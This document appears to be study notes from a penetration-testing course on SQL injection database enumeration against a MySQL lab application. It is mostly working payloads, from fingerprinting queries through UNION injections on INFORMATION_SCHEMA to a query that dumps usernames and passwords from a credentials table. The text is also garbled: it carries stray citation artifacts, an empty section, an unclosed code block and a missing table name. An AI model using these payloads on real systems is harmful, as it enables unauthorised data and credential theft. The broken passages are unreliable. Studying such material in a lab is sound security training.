# Database Enumeration

In previous sections, we learned:
- how SQL queries work
- how SQL Injection works
- how to use UNION Injection

Now we move into:
```text
Database Enumeration
```

This is the process of gathering information from the DBMS using SQL Injection.

With proper enumeration, attackers can discover:
- database names
- tables
- columns
- usernames
- passwords
- API keys
- sensitive internal data

:contentReference[oaicite:0]{index=0}

---

# MySQL Fingerprinting

Before enumerating data, we first need to identify:
```text id="f4w8al"
Which DBMS is running
```

Different database systems use:
- different syntax
- different functions
- different queries

Knowing the DBMS helps us:
```text id="yq6a92"
Craft correct payloads
```

---

# Guessing the Database Type

Sometimes the web server provides clues.

For example:

| Web Server | Likely Operating System | Likely DBMS |
|---|---|---|
| Apache | Linux | MySQL/MariaDB |
| Nginx | Linux | MySQL/MariaDB |
| IIS | Windows | MSSQL |

However:
```text id="qqigmx"
This is only an assumption
```

because many databases can run on multiple operating systems.

So we confirm the DBMS through:
```text id="01y2k4"
SQL fingerprinting queries
```

---

# MySQL Fingerprinting Payloads

## 1. Version Query

```sql id="0qv16v"
SELECT @@version
```

Expected output in MySQL/MariaDB:

```text id="4e2imf"
10.3.22-MariaDB-1ubuntu1
```

:contentReference[oaicite:1]{index=1}

This directly reveals:
- DBMS type
- version
- distribution

---

## 2. Numeric Output Testing

```sql id="73zwfk"
SELECT POW(1,1)
```

Expected result:

```text id="z9ajc5"
1
```

Useful when:
```text id="i59c4q"
Only numeric responses are visible
```

---

## 3. Time-Based Fingerprinting

```sql id="v8v00z"
SELECT SLEEP(5)
```

Expected behavior:
```text id="n1zyh4"
Page delays for 5 seconds
```

Useful for:
- blind SQL Injection
- no-output environments

:contentReference[oaicite:2]{index=2}

# INFORMATION_SCHEMA Database

Once we identify MySQL, we move into:
```text
Database Enumeration
```

The most important database for enumeration is:

```text id="0c6s9y"
INFORMATION_SCHEMA
```

This database contains:
```text id="88chdl"
Metadata about all databases, tables, and columns
```

Think of it as:
```text id="rv7z35"
A database that describes other databases
```

Attackers use it heavily during SQL Injection.

:contentReference[oaicite:4]{index=4}

---

# Important Enumeration Goals

To fully enumerate the database, we need:

1. Database names
2. Table names
3. Column names
4. Actual data

---

# Referencing Other Databases

To query tables from another database, we use:
```text
dot notation
```

Syntax:

```sql id="2tejlwm"
SELECT * FROM database_name.table_name;
```

Example:

```sql id="5ivudx"
SELECT * FROM my_database.users;
```

:contentReference[oaicite:5]{index=5}

---

# Enumerating Databases

The table:
```text
INFORMATION_SCHEMA.SCHEMATA
```

contains all database names.

The important column is:

```text id="hgtqcf"
SCHEMA_NAME
```

---

# Querying Database Names

```sql id="g0g4r4"
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
```

Example output:

```text id="jlwmz2"
mysql
information_schema
performance_schema
ilfreight
dev
```

:contentReference[oaicite:6]{index=6}

---

# Default Databases

These databases are usually default MySQL databases:

- mysql
- information_schema
- performance_schema
- sys

These are commonly ignored during enumeration.

The interesting databases are usually:
```text id="65wlu9"
Custom application databases
```

such as:
- `ilfreight`
- `dev`

---

# Enumerating Databases via UNION Injection

Payload:

```sql id="mlr3f8"
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
```

:contentReference[oaicite:7]{index=7}

This returns:
- all database names
- directly in the webpage response

---

# Finding Current Database

To identify which database the application currently uses:

```sql id="phv9vu"
SELECT database()
```

Injection:

```sql id="8ohjv7"
cn' UNION select 1,database(),2,3-- -
```

Output:

```text id="oaqvgt"
ilfreight
```

:contentReference[oaicite:8]{index=8}

This tells us:
```text id="bd8ozs"
The web application runs on the ilfreight database
```

---

# Enumerating Tables

After identifying databases, the next step is:
```text
Finding tables
```

The table:

```text id="s5k1y0"
INFORMATION_SCHEMA.TABLES
```

contains all tables.

Important columns:
- `TABLE_NAME`
- `TABLE_SCHEMA`

---

# Finding Tables in a Specific Database

Payload:

```sql id="a5qwy0"
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
```

:contentReference[oaicite:9]{index=9}

This returns tables from the:
```text id="gzjslk"
dev
```

database only.

---

# Example Tables Found

# Enumerating Columns

Before dumping data, we must know:
```text id="nj9k3l"
Column names

The table:

```text id="9pf3q4"

```

Important columns:
- `COLUMN_NAME`

---

# Finding Columns in credentials Table

Payload:

```sql id="7cl6r2"
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```

:contentReference[oaicite:10]{index=10}

Output reveals columns:

```text id="6jgmsp"
username
password
```

# Dumping Actual Data

Now we finally have:
- database name
- table name
- column names

We can dump real data.

# Extracting Credentials

Payload:

```sql id="49xgvc"
cn' UNION select 1,username,password,4 from dev.credentials-- -
```

# Why Database Enumeration is Critical

Enumeration transforms SQL Injection from:
```text id="7ccn83"
Simple vulnerability
```

into:
```text id="0a7n2r"
Full data extraction attack
```

Without enumeration:
- attackers do not know table names
- attackers cannot dump data
- attackers cannot navigate databases

Enumeration is:
```text id="3d5zbs"
The foundation of advanced SQLi exploitation
```

```text id="c7xuk5"

- INFORMATION_SCHEMA
- SCHEMATA
